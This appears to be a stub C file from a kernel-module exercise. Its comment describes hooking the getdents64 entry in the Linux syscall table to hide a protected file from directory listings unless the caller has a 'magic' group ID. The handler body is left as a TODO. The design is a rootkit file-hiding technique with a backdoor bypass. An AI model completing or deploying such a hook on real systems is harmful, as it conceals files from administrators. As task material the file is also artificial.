// SPDX-License-Identifier: GPL-2.0
/*
 * cloak_tbl.c — Guardian Module (syscall table variant), Part 3
 *
 * Replacement handler for sys_call_table[__NR_getdents64].
 * Hides PROTECTED_BASENAME from directory listings unless the caller
 * has MAGIC_GID.
 *
 * Direct pt_regs: regs->regs[1] = dirp (no double indirection).
 * Calls original, then filters the dirent buffer.
 */

#include "guardian_table.h"
#include <asm/ptrace.h>
#include <linux/dirent.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

static long hooked_getdents64(const struct pt_regs *regs) {
  // TODO: Your implementation here
}

syscall_fn_t cloak_get_hook(void) { return hooked_getdents64; }
